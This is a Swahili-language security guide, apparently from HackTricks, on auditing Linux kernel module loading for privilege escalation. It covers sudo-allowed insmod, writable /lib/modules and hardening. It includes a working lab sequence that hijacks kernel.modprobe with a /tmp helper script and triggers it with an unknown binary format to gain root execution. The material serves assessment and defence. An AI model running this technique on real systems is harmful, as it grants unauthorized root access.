# Kernel Modules na Matumizi Mabaya ya modprobe

{{#include ../../banners/hacktricks-training.md}}

## Kernel module na Usanidi Mbaya wa upakiaji wa modules

Msaada wa Kernel module ni eneo lenye athari kubwa wakati wa kukagua Linux privilege escalation. Usichukulie kila ujumbe wa unsigned-module kuwa exploitable peke yake, bali uutumie kujibu maswali ya kivitendo:

- Je, mtumiaji wa sasa anaweza kupakia modules kupitia `sudo`, capabilities, au njia ya helper inayoweza kuandikwa?
- Je, module loading bado imewezeshwa?
- Je, module signature enforcement imezimwa?
- Je, module directories au module files zinaweza kuandikwa?
- Je, kernel logs zinaweza kusomwa ili kuthibitisha kilichotokea?

Triage ya haraka:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Tafsiri:

- `modules_disabled=1` inamaanisha modules mpya haziwezi kupakiwa hadi kuwashwa upya.
- `module_sig_enforce=1` kwa kawaida huzuia modules zisizosainiwa.
- `dmesg_restrict=0` huwawezesha users wasio na privileges kusoma kernel logs kwenye systems nyingi.
- Njia zinazoweza kuandikwa chini ya `/lib/modules/$(uname -r)/` ni hatari kwa sababu module discovery na auto-loading vinaweza kuamini tree hiyo.

### Kupakia module na kusoma kernel output

Ikiwa una ruhusa halali ya kupakia local module, `insmod` huingiza faili halisi ya `.ko` unayotoa. Module's init function huendeshwa mara moja, na messages zinazoandikwa kwa `printk()` huonekana kwenye kernel logs.

Minimal workflow kwa ajili ya review au lab environments:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ikiwa `sudo -l` inaruhusu `insmod`, `modprobe`, au wrapper inayozizunguka, ichukulie kuwa ni hatari kubwa:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Sudo rule inayomruhusu mtumiaji kuendesha `insmod` haiwezi kulinganishwa na kuruhusu administrative helper ya kawaida. Initialization code ya module huendeshwa katika kernel context mara tu `.ko` inapoingizwa, kwa hiyo swali la msingi katika review ni: "je, mtumiaji huyu anaweza kuchagua au kurekebisha module inayopakiwa?"

Mtiririko wa jumla wa review:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ikiwa mtumiaji anaweza kutoa `.ko` ya kiholela, sheria hiyo inapaswa kuchukuliwa kama full system compromise katika authorized assessment. Mfumo salama zaidi wa kiutendaji ni kuepuka kuruhusu module loading kupitia sudo; ikiwa haiwezi kuepukwa, zuia path kamili, ownership, permissions, signing policy na mchakato wa kuiondoa.

Kwa pattern isiyo na madhara ya kujenga module katika controlled lab, source na Makefile ndogo vinaweza kuwa kama ifuatavyo:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Jenga na pakia tu katika maabara iliyoidhinishwa:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Ukaguzi wa matumizi mabaya ya `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` hudhibiti userspace helper anayeitwa na kernel inapohitaji usaidizi wa kupakia module. Ikiwa attacker anaweza kuibadilisha iwe executable path inayoweza kuandikwa na kuchochea unknown binary format au njia nyingine ya kuomba module, inaweza kusababisha root code execution.

Kagua helper wa sasa:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Angalia kama unaweza kuiathiri:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Muundo wa jumla wa maabara pekee:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Kwenye mifumo iliyolindwa, hii inapaswa kushindikana kwa sababu users wasio na privileges hawawezi kuandika kwenye `kernel.modprobe`, njia ya helper haiwezi kuandikwa, au njia za kupakia modules zimezuiwa.

### Ukaguzi wa `/lib/modules` zinazoweza kuandikwa

Directories za modules zinazoweza kuandikwa zinaweza kuruhusu kubadilishwa kwa modules, kupandikizwa kwa modules hasidi, au kutumiwa vibaya kwa auto-load kulingana na jinsi `modprobe` itakavyoitwa baadaye.

Kagua locations zinazoweza kuandikwa:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Iwapo utapata maudhui ya module yanayoweza kuandikwa, kagua jinsi modules zinavyogunduliwa:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Maelezo ya kiulinzi:

- Weka `/lib/modules` ikiwa inamilikiwa na `root:root` na haiwezi kuandikwa na users.
- Weka `kernel.modules_disabled=1` baada ya boot pale inapowezekana kiutendaji.
- Tekeleza module signing kwenye systems zinazohitaji modules zinazoweza kupakiwa.
- Fuatilia uandishi kwenye `/proc/sys/kernel/modprobe`, `/lib/modules`, na utekelezaji usiotarajiwa wa `insmod`/`modprobe`.
{{#include ../../banners/hacktricks-training.md}}
